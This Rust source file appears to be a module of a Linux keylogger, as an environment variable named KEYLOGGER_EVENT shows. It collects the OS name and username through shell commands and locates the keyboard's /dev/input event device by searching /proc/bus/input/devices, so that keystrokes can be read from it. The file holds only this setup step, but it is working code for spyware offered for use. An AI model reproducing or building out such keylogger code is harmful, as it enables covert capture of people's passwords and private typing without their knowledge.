use std::process::Command;
#[derive(Debug)]
//Struct showing details of the system
//OS - Linux/Windows
//Username - whoami
//Event path - /dev/input/event* path of the keyboard event file
#[allow(dead_code)]
// System details struct – clean definition
pub struct SystemDetails {
    pub os: String,
    pub username: String,
    pub event_path: String,
}

//Function to get system details
//All system details are taen using shell scripts
fn shell_command(cmd:&str)->String{
    let mut my_cmd = Command::new("sh");
    my_cmd.arg("-c")
              .arg(cmd);
    let my_cmd = my_cmd.output().expect("failed to execute process");

    let s = String::from_utf8(my_cmd.stdout).expect("Found invalid UTF-8");
    // Preserve only the first whitespace‑separated token (e.g., "event9")
    let token = s.split_whitespace().next().unwrap_or("");
    let output = token.to_string();
    return output;
}

//Parameters of sell commands are given here
impl SystemDetails {
    pub fn details()->SystemDetails{
        SystemDetails{
            os:shell_command("uname"),
            username:shell_command("whoami"),
            // Allow the caller to force a specific event device via the KEYLOGGER_EVENT env var.
            // If the variable is set (and non‑empty) we use it; otherwise we fall back to the original heuristic.
            event_path: {
                if let Ok(val) = std::env::var("KEYLOGGER_EVENT") {
                    if !val.is_empty() {
                        println!("[DEBUG] KEYLOGGER_EVENT env var detected: {}", val);
                        format!("/dev/input/{}", val)
                    } else {
                        let ev = shell_command(
                            "grep -E 'Handlers.*kbd' /proc/bus/input/devices | grep -Eo 'event[0-9]+' | sort -V | tail -n1",
                        );
                        format!("/dev/input/{}", ev)
                    }
                } else {
                    let ev = shell_command(
                        "grep -E 'Handlers.*kbd' /proc/bus/input/devices | grep -Eo 'event[0-9]+' | sort -V | tail -n1",
                    );
                    format!("/dev/input/{}", ev)
                }
            },
        }

    }
}
